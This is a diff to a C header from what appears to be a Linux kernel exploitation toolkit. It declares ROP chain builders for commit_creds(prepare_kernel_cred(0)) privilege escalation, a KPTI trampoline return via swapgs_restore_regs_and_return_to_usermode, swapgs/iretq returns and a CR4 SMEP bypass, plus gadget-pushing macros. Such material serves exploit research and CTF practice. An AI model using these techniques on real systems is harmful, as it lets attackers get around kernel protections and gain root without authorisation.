@@ -4,6 +4,7 @@
 #include <stdint.h>
 #include <sys/types.h>
 #include "ret2user.h"
+#include "kpti_trampoline.h"
 
 /* Typedef a struct for rop chain rop[]
  *      to avoid bug when copying 0 from the chain to buffer
@@ -18,17 +19,45 @@ typedef struct {
 } rop_buffer_t;
 
 
-/* ============= Kcreds Commit =============
+/* ============= Kcreds =============
  * Privesc with commit_creds(prepare_kernel_cred(0));
- *      then call iretq (from kernel codes) to return to user space
-
- * prepare_kernel_cred -> commit_creds -> swapgs -> iretq
+ *      to become root  
  * */
-size_t chain_kcred_iretq(rop_buffer_t rop,
+size_t chain_commit_creds(rop_buffer_t rop,
                         uintptr_t pop_rdi_ret,
                         uintptr_t prepare_kernel_cred,
                         rop_buffer_t mov_rdi_rax_chain,
-                        uintptr_t commit_creds,
+                        uintptr_t commit_creds);
+
+
+/* ============= KPTI Trampoline ============= */
+
+/* 
+ * KPTI trampoline (swapgs_restore_regs_and_return_to_usermode + 22)
+ *          +
+ * Fake trampoline stack:
+ *      junk,
+ *      junk,
+ *      user_rip,
+ *      user_cs,
+ *      user_rflags,
+ *      user_rsp,
+ *      user_ss
+ *
+ * More details in "kpti_trampoline.h"
+ */
+size_t chain_kpti_trampoline(rop_buffer_t rop,
+                            uintptr_t kpti_trampoline,
+                            iretq_user_ctx_t ctx);
+
+
+/* ============= iretq  =============
+ * After privesc, return to user space with:
+ *      swapgs ... iretq
+ * 
+ * Control RIP, CS, RFLAGS, RSP, SS registers on stack frame 
+ * */
+size_t chain_swapgs_iretq(rop_buffer_t rop,
                         uintptr_t swapgs_pop_rbp_ret,
                         uintptr_t iretq,
                         iretq_user_ctx_t ctx);
@@ -60,9 +89,12 @@ size_t chain_cr4_smep(rop_buffer_t rop,
 /* Push gadgets onto an ROP chain (rop_buffer_t) */
 #define PUSH_ROP(dst, pos, gadget) do {                    \
     if ((pos) >= (dst).count)                              \
-        DIE("ROP buffer overflow at %s:%d", __FILE__, __LINE__); \
+        DIE("PUSH_ROP: ROP overflows at %s:%d", __FILE__, __LINE__); \
     (dst).chain[(pos)++] = (gadget);                       \
 } while (0)
+
+/* Shrink ROP (rop_buffer_t) count after chaining up with its return size */
+#define TRIM_ROP(rop, len) do { (rop).count = (len);  } while (0)
 
 /*
  * concat_rop_list - concatenate multiple ROPs (rop_buffer_t) into one buffer
